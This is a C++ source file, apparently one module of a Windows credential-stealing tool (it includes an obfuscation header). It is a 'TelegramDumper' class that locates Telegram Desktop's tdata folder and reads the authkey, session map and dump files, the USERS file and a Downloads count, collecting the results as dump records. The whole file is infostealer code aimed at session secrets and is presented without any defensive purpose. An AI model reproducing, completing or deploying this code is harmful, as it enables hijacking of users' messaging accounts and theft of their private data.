#include <windows.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include "dumper.h"
#include "obfuscate.h"
#include "config.h"

// -------------------------------------------------------------------
// Telegram session dumper - reads tdata directory
// -------------------------------------------------------------------
class TelegramDumper : public Dumper {
private:
    std::wstring m_tdataPath;
    
    // Check if tdata directory exists
    bool HasTData(const std::wstring& basePath) {
        std::wstring tdata = PathCombine(basePath, TELEGRAM_PATH);
        DWORD attr = GetFileAttributesW(tdata.c_str());
        return (attr != INVALID_FILE_ATTRIBUTES && 
                (attr & FILE_ATTRIBUTE_DIRECTORY));
    }
    
    // Read authkey file (the main session identifier)
    DumpResult ReadAuthKey(const std::wstring& tdataPath) {
        std::wstring authKeyPath = PathCombine(tdataPath, L"authkey");
        std::vector<unsigned char> data;
        
        if (!ReadFileContents(authKeyPath, data))
            return DumpResult(L"Telegram", L"authkey", L"[NOT FOUND]", L"", L"No authkey file");
        
        // authkey is the 256-byte authorization key
        if (data.size() < 256)
            return DumpResult(L"Telegram", L"authkey", L"[INVALID SIZE]", L"", 
                              L"authkey too small: " + std::to_wstring(data.size()) + L" bytes");
        
        // Take first 32 bytes as fingerprint
        std::wstringstream ss;
        ss << std::hex << std::setfill(L'0');
        for (size_t i = 0; i < 32 && i < data.size(); ++i) {
            ss << std::setw(2) << static_cast<int>(data[i]);
        }
        
        std::wstring fingerprint = ss.str();
        std::wstring notes = L"authkey file found. Size: " + 
                             std::to_wstring(data.size()) + L" bytes. Fingerprint available.";
        
        return DumpResult(L"Telegram", L"authkey", fingerprint, L"", notes);
    }
    
    // Read map files (session data maps)
    std::vector<DumpResult> ReadMapFiles(const std::wstring& tdataPath) {
        std::vector<DumpResult> results;
        
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = PathCombine(tdataPath, L"map*");
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    std::wstring filePath = PathCombine(tdataPath, findData.cFileName);
                    std::vector<unsigned char> data;
                    
                    if (ReadFileContents(filePath, data)) {
                        std::wstring notes = L"map file: " + std::wstring(findData.cFileName);
                        notes += L", size: " + std::to_wstring(data.size()) + L" bytes";
                        
                        results.emplace_back(
                            L"Telegram",
                            L"map:" + std::wstring(findData.cFileName),
                            L"[SESSION DATA]",
                            L"",
                            notes
                        );
                    }
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
        
        return results;
    }
    
    // Read USERS file
    std::vector<DumpResult> ReadUsersFile(const std::wstring& tdataPath) {
        std::vector<DumpResult> results;
        
        std::wstring usersPath = PathCombine(tdataPath, L"USERS");
        std::vector<unsigned char> data;
        
        if (!ReadFileContents(usersPath, data))
            return results;
        
        std::wstring notes = L"USERS file found. Size: " + 
                             std::to_wstring(data.size()) + L" bytes";
        
        // Try to extract user IDs from the binary data
        std::wstringstream ss;
        ss << L"USERS file raw hex dump (first 128 bytes): ";
        for (size_t i = 0; i < 128 && i < data.size(); ++i) {
            wchar_t buf[4];
            swprintf(buf, 4, L"%02X", static_cast<unsigned char>(data[i]));
            ss << buf;
        }
        
        results.emplace_back(
            L"Telegram",
            L"USERS",
            L"[USER DATA]",
            L"",
            notes + L". " + ss.str()
        );
        
        return results;
    }
    
    // Read dumps (old session data)
    std::vector<DumpResult> ReadDumps(const std::wstring& tdataPath) {
        std::vector<DumpResult> results;
        
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = PathCombine(tdataPath, L"dumps/*");
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    std::wstring filePath = PathCombine(
                        PathCombine(tdataPath, L"dumps"), 
                        findData.cFileName);
                    std::vector<unsigned char> data;
                    
                    if (ReadFileContents(filePath, data)) {
                        std::wstring notes = L"dump file: " + 
                                             std::wstring(findData.cFileName);
                        notes += L", size: " + std::to_wstring(data.size()) + L" bytes";
                        
                        results.emplace_back(
                            L"Telegram",
                            L"dump:" + std::wstring(findData.cFileName),
                            L"[SESSION DATA]",
                            L"",
                            notes
                        );
                    }
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
        
        return results;
    }
    
    // Read download directory listing
    std::vector<DumpResult> ReadDownloads(const std::wstring& tdataPath) {
        std::vector<DumpResult> results;
        
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = PathCombine(tdataPath, L"Downloads/*");
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            int fileCount = 0;
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                    fileCount++;
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
            
            results.emplace_back(
                L"Telegram",
                L"Downloads",
                L"[DIR LISTING]",
                L"",
                L"Downloads directory contains " + std::to_wstring(fileCount) + L" files"
            );
        }
        
        return results;
    }
    
public:
    TelegramDumper() {}
    
    virtual const wchar_t* Name() const override {
        return L"Telegram";
    }
    
    virtual std::vector<DumpResult> Dump() override {
        std::vector<DumpResult> results;
        
        // Check common Telegram Desktop paths
        std::wstring localAppData = GetLocalAppData();
        std::wstring roamingAppData = GetAppData();
        
        // Paths to check
        std::wstring paths[] = {
            PathCombine(localAppData, L"Telegram Desktop"),
            PathCombine(roamingAppData, L"Telegram Desktop"),
            PathCombine(localAppData, L"Telegram"),
            PathCombine(roamingAppData, L"Telegram"),
            L"C:\\Program Files\\Telegram Desktop",
            L"C:\\Program Files (x86)\\Telegram Desktop"
        };
        
        for (const auto& basePath : paths) {
            if (!HasTData(basePath))
                continue;
            
            std::wstring tdataPath = PathCombine(basePath, TELEGRAM_PATH);
            
            auto authResult = ReadAuthKey(tdataPath);
            if (authResult.password.find(L"[NOT FOUND]") == std::wstring::npos)
                results.push_back(authResult);
            
            auto mapResults = ReadMapFiles(tdataPath);
            results.insert(results.end(), mapResults.begin(), mapResults.end());
            
            auto userResults = ReadUsersFile(tdataPath);
            results.insert(results.end(), userResults.begin(), userResults.end());
            
            auto dumpResults = ReadDumps(tdataPath);
            results.insert(results.end(), dumpResults.begin(), dumpResults.end());
            
            auto dlResults = ReadDownloads(tdataPath);
            results.insert(results.end(), dlResults.begin(), dlResults.end());
            
            // We found tdata, no need to check other paths
            break;
        }
        
        return results;
    }
};
